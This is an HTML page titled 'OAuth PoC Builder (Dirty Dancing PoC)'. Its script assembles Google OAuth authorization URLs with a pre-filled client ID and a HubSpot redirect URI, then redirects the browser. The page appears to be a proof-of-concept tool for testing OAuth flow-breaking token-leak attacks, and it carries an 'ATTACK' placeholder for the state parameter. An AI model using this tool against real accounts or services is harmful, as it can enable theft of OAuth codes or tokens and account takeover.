<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>OAuth PoC Builder</title>
  <style>
    body { font-family: Arial; padding: 20px; }
    input, select { display: block; margin-bottom: 10px; width: 400px; padding: 5px; }
    button { padding: 10px 15px; }
  </style>
</head>
<body>

<h2>OAuth Request Builder (Dirty Dancing PoC)</h2>

<label>Client ID</label>
<input id="client_id" value="466680526474.apps.googleusercontent.com">

<label>Redirect URI</label>
<input id="redirect_uri" value="https://app.hubspot.com/login/googleLoginRedirect">

<label>Response Type</label>
<input id="response_type" value="code id_token">

<label>Scope</label>
<input id="scope" value="email profile">

<label>Prompt</label>
<input id="prompt" placeholder="none / consent / select_account">

<label>State</label>
<input id="state" placeholder="ATTACK or URL">

<label>Nonce</label>
<input id="nonce" placeholder="random">

<button onclick="launch()">Launch OAuth</button>

<script>
function launch() {
  const params = new URLSearchParams();

  const client_id = document.getElementById("client_id").value;
  const redirect_uri = document.getElementById("redirect_uri").value;
  const response_type = document.getElementById("response_type").value;
  const scope = document.getElementById("scope").value;
  const prompt = document.getElementById("prompt").value;
  const state = document.getElementById("state").value;
  const nonce = document.getElementById("nonce").value;

  if (client_id) params.set("client_id", client_id);
  if (redirect_uri) params.set("redirect_uri", redirect_uri);
  if (response_type) params.set("response_type", response_type);
  if (scope) params.set("scope", scope);
  if (prompt) params.set("prompt", prompt);
  if (state) params.set("state", state);
  if (nonce) params.set("nonce", nonce);

  // defaults for testing
  if (!state) params.set("state", "POC_" + Math.random());
  if (!nonce && response_type.includes("id_token")) {
    params.set("nonce", "TEST_" + Math.random());
  }

  const url = "https://accounts.google.com/o/oauth2/auth?" + params.toString();

  console.log("Redirecting to:", url);
  window.location = url;
}
</script>
